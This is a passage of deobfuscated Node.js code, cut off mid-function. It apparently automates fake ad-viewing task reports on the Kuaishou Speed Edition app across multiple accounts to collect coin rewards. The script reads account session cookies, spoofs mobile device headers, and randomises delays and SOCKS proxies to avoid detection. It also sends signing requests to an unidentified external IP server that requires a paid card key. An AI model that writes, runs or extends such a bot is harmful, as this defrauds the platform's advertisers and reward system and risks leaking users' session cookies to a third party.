//Sat Aug 30 2025 04:21:19 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function _0x1f034e(_0x223b0c) {
  const _0x39ccb3 = [{
      "name": "request",
      "package": "request"
    }, {
      "name": "querystring",
      "package": "querystring"
    }, {
      "name": "socks-proxy-agent",
      "package": "socks-proxy-agent"
    }],
    _0x1c3478 = [];
  for (const _0x4b4e2a of _0x39ccb3) {
    try {
      require(_0x4b4e2a.name);
    } catch (_0x44706d) {
      _0x1c3478.push(_0x4b4e2a.package);
    }
  }
  _0x1c3478.length > 0 && (_0x223b0c.error("❌ 缺少以下必需的库依赖:"), _0x1c3478.forEach(_0x146650 => {
    _0x223b0c.error("   - " + _0x146650);
  }), _0x223b0c.error("\n请运行以下命令安装缺失的依赖:"), _0x223b0c.error("npm install " + _0x1c3478.join(" ")), _0x223b0c.error("\n或者运行以下命令安装所有依赖:"), _0x223b0c.error("npm install"), process.exit(1));
  _0x223b0c.info("✅ 所有必需的库依赖检查通过");
}
class _0x531761 {
  constructor(_0x3e00bc) {
    this.name = _0x3e00bc;
    this.logs = [];
    this.startTime = Date.now();
  }
  ["getTimestamp"]() {
    const _0x3b5a2f = new Date(),
      _0x24ac26 = String(_0x3b5a2f.getHours()).padStart(2, "0"),
      _0xebb351 = String(_0x3b5a2f.getMinutes()).padStart(2, "0"),
      _0x363ef9 = String(_0x3b5a2f.getSeconds()).padStart(2, "0");
    return "[" + _0x24ac26 + ":" + _0xebb351 + ":" + _0x363ef9 + "]";
  }
  ["formatMessage"](_0x9adbc9, _0x512d8a) {
    const _0x388c07 = this.getTimestamp(),
      _0x4f36c1 = {
        "INFO": "[36m",
        "ERROR": "[31m",
        "WARN": "[33m",
        "DEBUG": "[35m",
        "SUCCESS": "[32m"
      },
      _0x68e85e = "[0m",
      _0x545459 = _0x4f36c1[_0x9adbc9] || "";
    return _0x388c07 + " " + _0x545459 + "[" + _0x9adbc9 + "]" + _0x68e85e + " " + _0x512d8a;
  }
  ["info"](..._0x59937d) {
    const _0x6990b4 = this.formatMessage("INFO", _0x59937d.join(" "));
    this.logs.push(_0x6990b4);
    console.log(_0x6990b4);
  }
  ["error"](..._0x53c09a) {
    const _0x1ede2c = this.formatMessage("ERROR", _0x53c09a.join(" "));
    this.logs.push(_0x1ede2c);
    console.log(_0x1ede2c);
  }
  ["warn"](..._0x5f26af) {
    const _0x181d61 = this.formatMessage("WARN", _0x5f26af.join(" "));
    this.logs.push(_0x181d61);
    console.log(_0x181d61);
  }
  ["debug"](..._0x37cdb6) {
    if (process.env.DEV_MODE === "true" || process.env.DEV_MODE === "1") {
      const _0x12e5ef = this.formatMessage("DEBUG", _0x37cdb6.join(" "));
      this.logs.push(_0x12e5ef);
      console.log(_0x12e5ef);
    }
  }
  ["success"](..._0xa9d6e) {
    const _0x22fa2b = this.formatMessage("SUCCESS", _0xa9d6e.join(" "));
    this.logs.push(_0x22fa2b);
    console.log(_0x22fa2b);
  }
  ["log"](..._0x8ca6c5) {
    this.info(..._0x8ca6c5);
  }
  ["isNode"]() {
    return "undefined" != typeof process && process.versions && process.versions.node;
  }
  ["getdata"](_0x6f0ad9) {
    return null;
  }
  ["done"]() {
    const _0x18b7d7 = Date.now(),
      _0x201aaa = Math.round((_0x18b7d7 - this.startTime) / 1000);
    this.success("🔔 " + this.name + ", 结束! 总耗时: " + _0x201aaa + "ç§’");
    process.exit(0);
  }
  ["start"]() {
    this.success("🔔 " + this.name + ", 开始!");
  }
}
const _0xa106f8 = new _0x531761("快手任务");
_0xa106f8.start();
_0x1f034e(_0xa106f8);
const _0x254b37 = require("request"),
  _0x72f0ce = require("querystring"),
  {
    SocksProxyAgent: _0x3a1bd0
  } = require("socks-proxy-agent");
let _0x2d52f7 = ("undefined" != typeof process && process.versions && process.versions.node ? process.env.ksck : _0xa106f8.getdata("ksck")) || "",
  _0x53828a = [],
  _0x27f0dc = 0,
  _0x249ce5 = 0,
  _0xdd56d7 = Date.now();
const _0x51801e = {
  "default": {
    "min": 30000,
    "max": 40001
  },
  "taskInterval": {
    "min": 30000,
    "max": 32000
  },
  "retry": {
    "min": 10000,
    "max": 13000
  },
  "longRetry": {
    "min": 10000,
    "max": 15000
  },
  "cycle": {
    "min": 10000,
    "max": 15000
  }
};
function _0x9e5fb8() {
  const _0x43e4c1 = process.env;
  if (_0x43e4c1.DELAY_CONFIG) try {
    const _0x358bbc = JSON.parse(_0x43e4c1.DELAY_CONFIG);
    if (_0x358bbc && typeof _0x358bbc === "object") {
      let _0x2e9cf9 = false;
      if (_0x358bbc.default && Array.isArray(_0x358bbc.default) && _0x358bbc.default.length === 2) {
        const [_0x198cf2, _0x198c76] = _0x358bbc.default.map(_0x36271b => parseInt(_0x36271b));
        !isNaN(_0x198cf2) && !isNaN(_0x198c76) && _0x198cf2 <= _0x198c76 && (_0x51801e.default.min = _0x198cf2, _0x51801e.default.max = _0x198c76, _0x2e9cf9 = true);
      }
      if (_0x358bbc.taskInterval && Array.isArray(_0x358bbc.taskInterval) && _0x358bbc.taskInterval.length === 2) {
        const [_0x43bad5, _0x269524] = _0x358bbc.taskInterval.map(_0x14b803 => parseInt(_0x14b803));
        !isNaN(_0x43bad5) && !isNaN(_0x269524) && _0x43bad5 <= _0x269524 && (_0x51801e.taskInterval.min = _0x43bad5, _0x51801e.taskInterval.max = _0x269524, _0x2e9cf9 = true);
      }
      if (_0x358bbc.retry && Array.isArray(_0x358bbc.retry) && _0x358bbc.retry.length === 2) {
        const [_0x5b750e, _0x1ba340] = _0x358bbc.retry.map(_0xa72d54 => parseInt(_0xa72d54));
        !isNaN(_0x5b750e) && !isNaN(_0x1ba340) && _0x5b750e <= _0x1ba340 && (_0x51801e.retry.min = _0x5b750e, _0x51801e.retry.max = _0x1ba340, _0x2e9cf9 = true);
      }
      if (_0x358bbc.longRetry && Array.isArray(_0x358bbc.longRetry) && _0x358bbc.longRetry.length === 2) {
        const [_0x546189, _0x584f7e] = _0x358bbc.longRetry.map(_0x34ccf0 => parseInt(_0x34ccf0));
        if (!isNaN(_0x546189) && !isNaN(_0x584f7e) && _0x546189 <= _0x584f7e) {
          _0x51801e.longRetry.min = _0x546189;
          _0x51801e.longRetry.max = _0x584f7e;
          _0x2e9cf9 = true;
        }
      }
      if (_0x358bbc.cycle && Array.isArray(_0x358bbc.cycle) && _0x358bbc.cycle.length === 2) {
        const [_0x186ae4, _0x58751d] = _0x358bbc.cycle.map(_0x6d51a => parseInt(_0x6d51a));
        !isNaN(_0x186ae4) && !isNaN(_0x58751d) && _0x186ae4 <= _0x58751d && (_0x51801e.cycle.min = _0x186ae4, _0x51801e.cycle.max = _0x58751d, _0x2e9cf9 = true);
      }
      _0x2e9cf9 && _0xa106f8.info("延迟配置已通过 DELAY_CONFIG 更新");
    }
  } catch (_0x781706) {
    _0xa106f8.error("DELAY_CONFIG 配置解析失败: " + _0x781706.message);
  }
  if (_0x43e4c1.DELAY_MIN && _0x43e4c1.DELAY_MAX) {
    const _0x4ecb94 = parseInt(_0x43e4c1.DELAY_MIN),
      _0x5c72db = parseInt(_0x43e4c1.DELAY_MAX);
    !isNaN(_0x4ecb94) && !isNaN(_0x5c72db) && _0x4ecb94 <= _0x5c72db && (_0x51801e.default.min = _0x4ecb94, _0x51801e.default.max = _0x5c72db, _0xa106f8.info("延迟配置已更新: " + _0x4ecb94 + "-" + _0x5c72db + "ms"));
  }
  if (_0x43e4c1.TASK_DELAY_MIN && _0x43e4c1.TASK_DELAY_MAX) {
    const _0x5278a0 = parseInt(_0x43e4c1.TASK_DELAY_MIN),
      _0x12349a = parseInt(_0x43e4c1.TASK_DELAY_MAX);
    !isNaN(_0x5278a0) && !isNaN(_0x12349a) && _0x5278a0 <= _0x12349a && (_0x51801e.taskInterval.min = _0x5278a0, _0x51801e.taskInterval.max = _0x12349a, _0xa106f8.info("任务间延迟配置已更新: " + _0x5278a0 + "-" + _0x12349a + "ms"));
  }
  if (_0x43e4c1.RETRY_DELAY_MIN && _0x43e4c1.RETRY_DELAY_MAX) {
    const _0x1cd4cb = parseInt(_0x43e4c1.RETRY_DELAY_MIN),
      _0x26d693 = parseInt(_0x43e4c1.RETRY_DELAY_MAX);
    if (!isNaN(_0x1cd4cb) && !isNaN(_0x26d693) && _0x1cd4cb <= _0x26d693) {
      _0x51801e.retry.min = _0x1cd4cb;
      _0x51801e.retry.max = _0x26d693;
      _0xa106f8.info("重试延迟配置已更新: " + _0x1cd4cb + "-" + _0x26d693 + "ms");
    }
  }
  if (_0x43e4c1.LONG_RETRY_DELAY_MIN && _0x43e4c1.LONG_RETRY_DELAY_MAX) {
    const _0x320483 = parseInt(_0x43e4c1.LONG_RETRY_DELAY_MIN),
      _0x5e6753 = parseInt(_0x43e4c1.LONG_RETRY_DELAY_MAX);
    !isNaN(_0x320483) && !isNaN(_0x5e6753) && _0x320483 <= _0x5e6753 && (_0x51801e.longRetry.min = _0x320483, _0x51801e.longRetry.max = _0x5e6753, _0xa106f8.info("长重试延迟配置已更新: " + _0x320483 + "-" + _0x5e6753 + "ms"));
  }
  if (_0x43e4c1.CYCLE_DELAY_MIN && _0x43e4c1.CYCLE_DELAY_MAX) {
    const _0x13c5d1 = parseInt(_0x43e4c1.CYCLE_DELAY_MIN),
      _0x2c06a4 = parseInt(_0x43e4c1.CYCLE_DELAY_MAX);
    !isNaN(_0x13c5d1) && !isNaN(_0x2c06a4) && _0x13c5d1 <= _0x2c06a4 && (_0x51801e.cycle.min = _0x13c5d1, _0x51801e.cycle.max = _0x2c06a4, _0xa106f8.info("循环延迟配置已更新: " + _0x13c5d1 + "-" + _0x2c06a4 + "ms"));
  }
}
_0x9e5fb8();
function _0x182651(_0x2856ec) {
  if (!_0x2856ec || !_0x2856ec.trim()) {
    return null;
  }
  try {
    if (_0x2856ec.includes("|")) {
      const _0x5d4982 = _0x2856ec.split("|");
      if (_0x5d4982.length >= 2) {
        const [_0x22334d, _0x3abd08, _0x15bf84, _0x4cfba1] = _0x5d4982;
        return {
          "host": _0x22334d.trim(),
          "port": parseInt(_0x3abd08.trim()) || 1080,
          "auth": _0x15bf84 && _0x4cfba1 ? _0x15bf84.trim() + ":" + _0x4cfba1.trim() : undefined
        };
      }
    }
    if (_0x2856ec.includes(":")) {
      const [_0x5f2083, _0x75a7a] = _0x2856ec.split(":");
      return {
        "host": _0x5f2083.trim(),
        "port": parseInt(_0x75a7a.trim()) || 1080
      };
    }
    return {
      "host": _0x2856ec.trim(),
      "port": 1080
    };
  } catch (_0x896fbe) {
    return _0xa106f8.error("代理配置解析失败: " + _0x2856ec + ", 错误: " + _0x896fbe.message), null;
  }
}
const _0x7a741c = "undefined" != typeof process && process.versions ? process.env.DEV_MODE === "true" || process.env.DEV_MODE === "1" : false;
_0xa106f8.info("  - DEV_MODE:", process.env.DEV_MODE || "未设置");
_0xa106f8.info("  - 当前运行模式:", _0x7a741c ? "开发模式" : "正式模式");
function _0xb20768(_0x1042e7) {
  try {
    return String(_0x1042e7 || "").split(/[\s,;|]+/).map(_0x4725f3 => _0x4725f3.trim()).filter(Boolean).map(_0x314e4b => _0x314e4b.toLowerCase());
  } catch (_0x1c72fc) {
    return [];
  }
}
const _0x2337e8 = "undefined" != typeof process && process.versions ? process.env.KS_TASKS_ENABLE || process.env.KS_TASKS_ENABLED || process.env.TASKS_ENABLE || process.env.TASKS_ENABLED || "" : "",
  _0x5c43c3 = "undefined" != typeof process && process.versions ? process.env.KS_TASKS_DISABLE || process.env.KS_TASKS_DISABLED || process.env.TASKS_DISABLE || process.env.TASKS_DISABLED || "" : "",
  _0x496757 = new Set(_0xb20768(_0x2337e8)),
  _0x197ed3 = new Set(_0xb20768(_0x5c43c3)),
  _0x38e6c7 = _0x496757.size > 0;
if (_0x7a741c) {
  if (_0x197ed3.size > 0) _0xa106f8.info("  - 任务黑名单:", Array.from(_0x197ed3).join(","));
}
const _0x43f700 = "快手极速版",
  _0x20300f = "1.2.5";
function _0x399720(_0x31b4e8, _0x3468c7) {
  try {
    const _0x2f9462 = String(_0x31b4e8 || "").split(".").map(_0x350e8d => parseInt(_0x350e8d, 10) || 0),
      _0x462dd8 = String(_0x3468c7 || "").split(".").map(_0x1b41f1 => parseInt(_0x1b41f1, 10) || 0),
      _0x443dbc = Math.max(_0x2f9462.length, _0x462dd8.length);
    for (let _0x38fcbd = 0; _0x38fcbd < _0x443dbc; _0x38fcbd++) {
      const _0xe5fe2b = _0x2f9462[_0x38fcbd] || 0,
        _0x5a3e73 = _0x462dd8[_0x38fcbd] || 0;
      if (_0xe5fe2b > _0x5a3e73) return 1;
      if (_0xe5fe2b < _0x5a3e73) return -1;
    }
    return 0;
  } catch (_0xae63f6) {
    return 0;
  }
}
async function _0x1efc94() {
  try {
    const _0x182244 = {
        "method": "get",
        "url": "http://154.12.60.33:2323",
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
      },
      _0x30778a = await _0x5ab34c(_0x182244, null);
    if (!_0x30778a || typeof _0x30778a !== "object") {
      _0xa106f8.error("版本检查失败：无效响应，请联系tg：@LeaderXiu https://t.me/LeaderXiu");
      return;
    }
    const _0x3e50d6 = _0x30778a.name || _0x43f700,
      _0x5d3b1a = _0x30778a.latest_version || "",
      _0x10b690 = _0x30778a.release_notes || "",
      _0x35160d = _0x30778a.notes || "";
    if (!_0x5d3b1a) {
      _0xa106f8.error("版本检查失败：缺少 latest_version 字段");
      return;
    }
    const _0x6f167d = _0x399720(_0x20300f, _0x5d3b1a);
    if (_0x6f167d < 0) {
      _0xa106f8.warn(_0x3e50d6 + " 发现新版本 v" + _0x5d3b1a + "（当前 v" + _0x20300f + "ï¼‰");
      if (_0x10b690) _0xa106f8.info("更新说明: " + _0x10b690);
    } else {
      if (_0x6f167d > 0) {
        _0xa106f8.info(_0x3e50d6 + " 当前版本 v" + _0x20300f + " 新于远端 v" + _0x5d3b1a);
      } else _0xa106f8.info(_0x3e50d6 + " 已是最新版本 v" + _0x20300f);
    }
    _0xa106f8.info(_0x35160d);
  } catch (_0x59a9ca) {
    _0xa106f8.error("版本检查异常：" + _0x59a9ca.message + "不明错误，请联系tg：@LeaderXiu https://t.me/LeaderXiu");
  }
}
function _0x5ab34c(_0x4219f1, _0x313741 = null) {
  if (_0x313741) try {
    let _0x32c9ce = "socks5://" + _0x313741.host + ":" + _0x313741.port;
    if (_0x313741.auth) {
      _0x32c9ce = "socks5://" + _0x313741.auth + "@" + _0x313741.host + ":" + _0x313741.port;
    }
    const _0x18d732 = new _0x3a1bd0(_0x32c9ce);
    _0x4219f1.agent = _0x18d732;
    _0x7a741c && _0xa106f8.debug("使用代理: " + _0x313741.host + ":" + _0x313741.port);
  } catch (_0x4840e2) {
    _0xa106f8.error("代理配置错误: " + _0x4840e2.message);
  }
  return new Promise(_0x3f7d37 => {
    _0x254b37(_0x4219f1, (_0x8ed04b, _0x36ec7b, _0x3e6ca9) => {
      if (_0x8ed04b) {
        _0xa106f8.error("请求错误: " + _0x8ed04b.message);
        if (_0x7a741c) {
          _0xa106f8.debug("错误类型: " + (_0x8ed04b.code || "æœªçŸ¥"));
          if (_0x8ed04b.code === "ECONNREFUSED") _0xa106f8.debug("连接被拒绝，可能是服务器不可用或网络问题");else {
            if (_0x8ed04b.code === "ETIMEDOUT") _0xa106f8.debug("请求超时，网络连接缓慢");else _0x8ed04b.code === "ENOTFOUND" && _0xa106f8.debug("域名解析失败，检查网络连接");
          }
        }
        return _0x3f7d37(null);
      }
      if (_0x36ec7b && _0x36ec7b.statusCode) {
        if (_0x36ec7b.statusCode !== 200) {
          _0xa106f8.error("HTTP状态码错误: " + _0x36ec7b.statusCode);
          if (_0x7a741c) {
            _0xa106f8.debug("响应头: " + JSON.stringify(_0x36ec7b.headers, null, 2));
            if (_0x36ec7b.statusCode === 404) _0xa106f8.debug("资源未找到，请检查URL是否正确");else {
              if (_0x36ec7b.statusCode === 403) _0xa106f8.debug("访问被禁止，可能需要认证或权限不足");else {
                if (_0x36ec7b.statusCode === 500) _0xa106f8.debug("服务器内部错误");else {
                  if (_0x36ec7b.statusCode >= 500) {
                    _0xa106f8.debug("服务器错误，请稍后重试");
                  }
                }
              }
            }
          }
        }
      }
      try {
        const _0x2990be = JSON.parse(_0x3e6ca9);
        _0x3f7d37(_0x2990be);
      } catch (_0x2e7482) {
        _0xa106f8.error("JSON解析失败: " + _0x2e7482.message);
        if (_0x7a741c) {
          _0xa106f8.debug("原始响应内容: " + _0x3e6ca9.substring(0, 200) + "...");
        }
        _0x3f7d37(_0x3e6ca9);
      }
    });
  });
}
function _0x3b0413(_0x1236e4 = "default") {
  const _0x54d942 = _0x51801e[_0x1236e4] || _0x51801e.default,
    _0x278dfa = _0x54d942.max - _0x54d942.min;
  return Math.floor(_0x278dfa * Math.random()) + _0x54d942.min;
}
function _0x1c0a13() {
  return _0x3b0413("taskInterval");
}
function _0x1a5c73() {
  return _0x3b0413("retry");
}
function _0x342726() {
  return _0x3b0413("longRetry");
}
function _0x2b9d6e() {
  return _0x3b0413("cycle");
}
class _0x27a785 {
  constructor(_0x46ac95) {
    this.index = _0x46ac95.index;
    this.salt = _0x46ac95.salt;
    this.cookie = _0x46ac95.cookie;
    this.nickname = _0x46ac95.nickname || "è´¦å·" + this.index;
    this.proxyConfig = _0x46ac95.proxyConfig || null;
    this.extractCookieInfo();
    this.headers = {
      "Host": "nebula.kuaishou.com",
      "Connection": "keep-alive",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; MI 8 Lite Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Cookie": this.cookie,
      "content-type": "application/json"
    };
    this.path = "/rest/r/ad/task/report";
    this.query = "mod=Xiaomi%28MI%2011%29&appver=" + this.appver + "&egid=" + this.egid + "&did=" + this.did;
    this.startTime = Date.now();
    this.endTime = this.startTime - 25000;
    const _0x39ee8 = {
        "box": {
          "name": "宝箱广告",
          "encDataKey": "boxencData",
          "signKey": "boxsign",
          "businessId": 606,
          "posId": 20346,
          "subPageId": 100024064,
          "requestSceneType": 1,
          "taskType": 1
        },
        "look": {
          "name": "看广告得金币",
          "encDataKey": "encData",
          "signKey": "sign",
          "businessId": 672,
          "posId": 24067,
          "subPageId": 100026367,
          "requestSceneType": 1,
          "taskType": 1
        },
        "food": {
          "name": "饭补广告",
          "encDataKey": "fbencData",
          "signKey": "fbsign",
          "businessId": 9362,
          "posId": 24067,
          "subPageId": 100026367,
          "requestSceneType": 7,
          "taskType": 2
        }
      },
      _0x82236f = _0x39ce60 => {
        const _0x2ae414 = String(_0x39ce60 || "").toLowerCase();
        if (_0x38e6c7 && !_0x496757.has(_0x2ae414)) return false;
        if (_0x197ed3.has(_0x2ae414)) return false;
        return true;
      },
      _0xf862b2 = {};
    Object.keys(_0x39ee8).forEach(_0x592f76 => {
      if (_0x82236f(_0x592f76)) _0xf862b2[_0x592f76] = _0x39ee8[_0x592f76];
    });
    this.taskConfigs = _0xf862b2;
    if (_0x7a741c) {
      _0xa106f8.debug("账号[" + this.nickname + "] 已启用任务: " + (Object.keys(this.taskConfigs).join(",") || "æ— "));
    }
    this.taskStats = {};
    Object.keys(this.taskConfigs).forEach(_0x3ddbfc => {
      this.taskStats[_0x3ddbfc] = {
        "success": 0,
        "failed": 0,
        "totalReward": 0
      };
    });
    this.lowRewardStreak = 0;
    this.lowRewardThreshold = 10;
    this.lowRewardLimit = 3;
    this.stopAllTasks = false;
    this.taskLimitReached = {};
    Object.keys(this.taskConfigs).forEach(_0x19857e => {
      this.taskLimitReached[_0x19857e] = false;
    });
  }
  ["extractCookieInfo"]() {
    try {
      const _0x531807 = this.cookie.match(/egid=([^;]+)/);
      this.egid = _0x531807 ? _0x531807[1] : "";
      const _0x4d2c37 = this.cookie.match(/did=([^;]+)/);
      this.did = _0x4d2c37 ? _0x4d2c37[1] : "";
      const _0x2c03d5 = this.cookie.match(/userId=([^;]+)/);
      this.userId = _0x2c03d5 ? _0x2c03d5[1] : "";
      const _0x1cca45 = this.cookie.match(/kuaishou.api_st=([^;]+)/);
      this.kuaishou_api_st = _0x1cca45 ? _0x1cca45[1] : "";
      const _0x4445d9 = this.cookie.match(/appver=([^;]+)/);
      this.appver = _0x4445d9 ? _0x4445d9[1] : "";
      (!this.egid || !this.did) && _0xa106f8.error("账号[" + this.nickname + "] cookie格式错误，缺少必要信息");
    } catch (_0x12a2b0) {
      _0xa106f8.error("账号[" + this.nickname + "] 解析cookie失败: " + _0x12a2b0.message);
    }
  }
  async ["executeTask"](_0x293269) {
    const _0x19c191 = this.taskConfigs[_0x293269];
    if (!_0x19c191) return _0xa106f8.error("账号[" + this.nickname + "] 未知任务类型: " + _0x293269), false;
    if (this.taskLimitReached[_0x293269]) return false;
    try {
      const _0x288036 = await this.retryOperation(() => this.getAdInfo(_0x19c191), "èŽ·å–" + _0x19c191.name + "ä¿¡æ¯", 5);
      if (!_0x288036) return _0xa106f8.error("账号[" + this.nickname + "] 获取" + _0x19c191.name + "信息失败"), this.taskStats[_0x293269].failed++, false;
      const _0x18cb24 = _0x3b0413();
      _0xa106f8.success("账号[" + this.nickname + "] 获取" + _0x19c191.name + "信息成功，等待 " + Math.round(_0x18cb24 / 1000) + " 秒后继续...");
      await new Promise(_0x2e965e => setTimeout(_0x2e965e, _0x18cb24));
      const _0x2df2bf = await this.retryOperation(() => this.generateSignature(_0x288036.cid, _0x288036.llsid, _0x293269, _0x19c191), "ç”Ÿæˆ" + _0x19c191.name + "ç­¾å", 10);
      if (!_0x2df2bf) return _0xa106f8.error("账号[" + this.nickname + "] 生成" + _0x19c191.name + "签名失败"), this.taskStats[_0x293269].failed++, false;
      const _0x187fba = await this.retryOperation(() => this.submitReport(_0x2df2bf.sig, _0x2df2bf.sig3, _0x2df2bf.sigtoken, _0x2df2bf.post, _0x293269, _0x19c191), "æäº¤" + _0x19c191.name + "æŠ¥å‘Š", 5);
      if (_0x187fba.success) {
        this.taskStats[_0x293269].success++;
        this.taskStats[_0x293269].totalReward += _0x187fba.reward || 0;
        if ((_0x187fba.reward || 0) <= this.lowRewardThreshold) {
          this.lowRewardStreak++;
          if (this.lowRewardStreak >= this.lowRewardLimit) {
            _0xa106f8.error("账号[" + this.nickname + "] 连续" + this.lowRewardLimit + "次奖励≤" + this.lowRewardThreshold + "金币，停止该账号所有任务");
            this.stopAllTasks = true;
          }
        } else this.lowRewardStreak = 0;
      } else {
        this.taskStats[_0x293269].failed++;
      }
      return _0x187fba.success;
    } catch (_0x500bbf) {
      return _0xa106f8.error("账号[" + this.nickname + "] " + _0x19c191.name + "任务执行失败: " + _0x500bbf.message), this.taskStats[_0x293269].failed++, false;
    }
  }
  async ["executeTaskSmart"](_0x250935) {
    const _0x49196e = this.taskConfigs[_0x250935];
    if (!_0x49196e) return _0xa106f8.error("账号[" + this.nickname + "] 未知任务类型: " + _0x250935), false;
    if (this.taskLimitReached[_0x250935]) return false;
    const _0x2fcce6 = this.taskStats[_0x250935],
      _0x303db3 = _0x2fcce6.success + _0x2fcce6.failed,
      _0x32abcf = _0x303db3 > 0 ? _0x2fcce6.success / _0x303db3 : 1;
    let _0x39bc32 = 5;
    if (_0x32abcf < 0.3) _0x39bc32 = 3;else _0x32abcf > 0.8 && (_0x39bc32 = 8);
    try {
      const _0x1fe896 = await this.retryOperation(() => this.getAdInfo(_0x49196e), "èŽ·å–" + _0x49196e.name + "ä¿¡æ¯", _0x39bc32);
      if (!_0x1fe896) {
        return _0xa106f8.error("账号[" + this.nickname + "] 获取" + _0x49196e.name + "信息失败"), this.taskStats[_0x250935].failed++, false;
      }
      let _0x54fa61 = _0x3b0413();
      if (_0x32abcf < 0.5) _0x54fa61 = Math.floor(_0x54fa61 * 1.5);else _0x32abcf > 0.9 && (_0x54fa61 = Math.floor(_0x54fa61 * 0.8));
      _0xa106f8.success("账号[" + this.nickname + "] 获取" + _0x49196e.name + "信息成功，等待 " + Math.round(_0x54fa61 / 1000) + " 秒后继续...");
      await new Promise(_0x81879f => setTimeout(_0x81879f, _0x54fa61));
      const _0x5395d6 = await this.retryOperation(() => this.generateSignature(_0x1fe896.cid, _0x1fe896.llsid, _0x250935, _0x49196e), "ç”Ÿæˆ" + _0x49196e.name + "ç­¾å", Math.min(_0x39bc32 + 5, 15));
      if (!_0x5395d6) return _0xa106f8.error("账号[" + this.nickname + "] 生成" + _0x49196e.name + "签名失败"), this.taskStats[_0x250935].failed++, false;
      const _0x2ccf3a = await this.retryOperation(() => this.submitReport(_0x5395d6.sig, _0x5395d6.sig3, _0x5395d6.sigtoken, _0x5395d6.post, _0x250935, _0x49196e), "æäº¤" + _0x49196e.name + "æŠ¥å‘Š", _0x39bc32);
      return _0x2ccf3a.success ? (this.taskStats[_0x250935].success++, this.taskStats[_0x250935].totalReward += _0x2ccf3a.reward || 0, (_0x2ccf3a.reward || 0) <= this.lowRewardThreshold ? (this.lowRewardStreak++, this.lowRewardStreak >= this.lowRewardLimit && (_0xa106f8.error("账号[" + this.nickname + "] 连续" + this.lowRewardLimit + "次奖励≤" + this.lowRewardThreshold + "金币，停止该账号所有任务"), this.stopAllTasks = true)) : this.lowRewardStreak = 0) : this.taskStats[_0x250935].failed++, _0x2ccf3a.success;
    } catch (_0x27f2d5) {
      return _0xa106f8.error("账号[" + this.nickname + "] " + _0x49196e.name + "任务执行失败: " + _0x27f2d5.message), this.taskStats[_0x250935].failed++, false;
    }
  }
  async ["retryOperation"](_0x56695f, _0x1e48da, _0x46f6f9) {
    let _0x22ee1a = 0,
      _0xf8b9cc = null;
    while (_0x22ee1a < _0x46f6f9) {
      try {
        const _0x27d356 = await _0x56695f();
        if (_0x27d356) {
          return _0x27d356;
        }
        _0xf8b9cc = new Error(_0x1e48da + "返回空结果");
      } catch (_0x424ac1) {
        _0xf8b9cc = _0x424ac1;
        _0xa106f8.error("账号[" + this.nickname + "] " + _0x1e48da + "异常: " + _0x424ac1.message);
        _0x7a741c && _0x424ac1.stack && _0xa106f8.error("错误堆栈: " + _0x424ac1.stack.split("\n").slice(1, 4).join("\n"));
      }
      _0x22ee1a++;
      if (_0x22ee1a < _0x46f6f9) {
        _0xa106f8.error("账号[" + this.nickname + "] " + _0x1e48da + "失败，重试" + _0x22ee1a + "/" + _0x46f6f9);
        const _0x1ece16 = _0x1a5c73();
        await new Promise(_0x28360e => setTimeout(_0x28360e, _0x1ece16));
      } else _0xa106f8.error("账号[" + this.nickname + "] " + _0x1e48da + "失败，已达到最大重试次数"), _0x7a741c && _0xf8b9cc && (_0xa106f8.error("最终失败原因: " + _0xf8b9cc.message), _0xf8b9cc.code && _0xa106f8.error("错误代码: " + _0xf8b9cc.message));
    }
    return null;
  }
  async ["pollQueueStatus"](_0x59e3b1, _0x57e95c = "http://154.12.60.33:2424", _0x2f1856 = 60000, _0x1ad7ba = 2000) {
    const _0x4f930b = Date.now();
    while (Date.now() - _0x4f930b < _0x2f1856) {
      try {
        const _0x5b54a5 = {
            "method": "get",
            "url": _0x57e95c + "?queue_id=" + encodeURIComponent(_0x59e3b1),
            "headers": {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
          },
          _0x4388e5 = await _0x5ab34c(_0x5b54a5);
        if (_0x4388e5 && _0x4388e5.success) {
          if (_0x4388e5.status === "completed" || _0x4388e5.status === "processed") return _0x4388e5;
          if (_0x4388e5.status === "failed") return _0x4388e5;
        }
      } catch (_0x484d1e) {
        _0xa106f8.error("账号[" + this.nickname + "] 队列状态查询异常: " + _0x484d1e.message);
      }
      await new Promise(_0x4c5401 => setTimeout(_0x4c5401, _0x1ad7ba));
    }
    return {
      "success": false,
      "status": "failed",
      "error": "queue_timeout"
    };
  }
  async ["requestProxyWithQueue"](_0x5c457d) {
    try {
      const _0x58b317 = ("undefined" != typeof process && process.versions && process.versions.node ? process.env.km : "") || "";
      if (!_0x58b317) return _0xa106f8.error("账号[" + this.nickname + "] 未配置卡密(km)环境变量，无法请求加密服务"), null;
      const _0x1563bf = "http://154.12.60.33:2424/proxy.php",
        _0x1dd1b9 = {
          "method": "post",
          "url": _0x1563bf + "/proxy.php?card_key=" + encodeURIComponent(_0x58b317),
          "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "X-Card-Key": encodeURIComponent(_0x58b317),
            "X-Target-Alias": "ks_jsb"
          },
          "body": JSON.stringify(_0x5c457d)
        },
        _0x487cf7 = await _0x5ab34c(_0x1dd1b9);
      if (!_0x487cf7) return _0xa106f8.error("账号[" + this.nickname + "] 加密代理服务无响应"), null;
      if (_0x487cf7.success && (!_0x487cf7.status || _0x487cf7.status === "processed" || _0x487cf7.status === "completed")) {
        return _0x487cf7.data || _0x487cf7;
      }
      if (_0x487cf7.success && _0x487cf7.status === "queued" && _0x487cf7.queue_id) {
        const _0x4b62c4 = await this.pollQueueStatus(_0x487cf7.queue_id, _0x1563bf, 60000, 2000);
        if (_0x4b62c4 && _0x4b62c4.success && (_0x4b62c4.status === "completed" || _0x4b62c4.status === "processed")) return _0x4b62c4.data || _0x4b62c4;
        return _0xa106f8.error("账号[" + this.nickname + "] 加密队列处理失败: " + (_0x4b62c4 && (_0x4b62c4.error || _0x4b62c4.message || _0x4b62c4.status))), null;
      }
      return _0xa106f8.error("账号[" + this.nickname + "] 加密代理返回失败: " + (_0x487cf7.error || _0x487cf7.message || _0x487cf7.status || "未知错误")), null;
    } catch (_0xe04d2d) {
